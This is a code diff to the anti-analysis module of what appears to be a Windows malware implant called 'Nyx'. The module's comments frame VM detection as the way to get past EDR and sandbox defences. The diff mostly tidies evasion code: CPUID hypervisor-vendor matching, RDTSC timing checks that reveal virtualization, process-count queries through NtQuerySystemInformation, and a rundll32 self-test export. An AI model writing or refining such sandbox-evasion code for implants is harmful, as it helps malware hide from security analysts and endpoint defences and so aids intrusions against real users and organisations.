@@ -5,8 +5,8 @@
 //! Before this module Nyx had ZERO VM/sandbox detection — the only anti-
 //! analysis surface was `antidebug.rs` (PEB.BeingDebugged + ProcessDebugPort
 //! + GetTickCount64 uptime, the last of which was compiled-out at the call
-//! site via `looks_sandboxed(0)`). A 2026 EDR/sandbox's first line of defense
-//! is VM detection, so this was Nyx's single biggest blind spot.
+//!   site via `looks_sandboxed(0)`). A 2026 EDR/sandbox's first line of defense
+//!   is VM detection, so this was Nyx's single biggest blind spot.
 //!
 //! ## Design — "quiet suite", zero-API-first
 //! A noisy VM check is ITSELF an IOC (EDR/AV fingerprint the *act* of
@@ -43,6 +43,7 @@
 
 #![cfg(target_os = "windows")]
 
+use alloc::vec;
 use nyx_implant_core::resolve;
 
 // ---- (1) CPUID hypervisor vendor string -----------------------------------
@@ -97,7 +98,7 @@ fn cpuid_hypervisor_vendor() -> Option<[u8; 12]> {
 pub fn cpuid_vm_vendor_match() -> bool {
     match cpuid_hypervisor_vendor() {
         None => false,
-        Some(sig) => VM_VENDOR_SIGS.iter().any(|k| *k == sig),
+        Some(sig) => VM_VENDOR_SIGS.contains(&sig),
     }
 }
 
@@ -592,10 +593,8 @@ pub unsafe fn looks_like_analysis_env() -> EnvVerdict {
     // was inconclusive but timing strongly flags virtualization. This catches
     // sandboxes that hide their CPUID signature / MAC but can't hide VM-exit
     // overhead.
-    if rdtsc_cpuid_is_virtualized() {
-        if cpuid_hypervisor_vendor() != Some(*b"Microsoft Hv") {
-            return EnvVerdict::AnalysisEnv;
-        }
+    if rdtsc_cpuid_is_virtualized() && cpuid_hypervisor_vendor() != Some(*b"Microsoft Hv") {
+        return EnvVerdict::AnalysisEnv;
     }
 
     EnvVerdict::Clean
@@ -673,8 +672,7 @@ unsafe fn running_process_count_query() -> Option<nyx_implant_core::heap::Vec<u8
 
     // Start with a modest buffer; grow once if needed.
     let buf_size: u32 = 64 * 1024; // 64 KiB — enough for ~100 processes
-    let mut buf = nyx_implant_core::heap::Vec::with_capacity(buf_size as usize);
-    buf.resize(buf_size as usize, 0u8);
+    let mut buf = vec![0u8; buf_size as usize];
 
     let mut needed: u32 = 0;
     let status = nt_query(SYSTEM_PROCESS_INFO, buf.as_mut_ptr(), buf_size, &mut needed);
@@ -770,6 +768,11 @@ pub unsafe fn looks_like_cloud_server() -> bool {
 ///   0xCF = probe failed (could not resolve APIs)
 ///
 /// Useful for validating the suite against known VM/bare-metal hosts.
+///
+/// # Safety
+/// Exported test entry point (via `rundll32`). Takes no arguments and
+/// terminates the host process via `ExitProcess`; run only in a sacrificial
+/// test process.
 #[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_envprobe() {
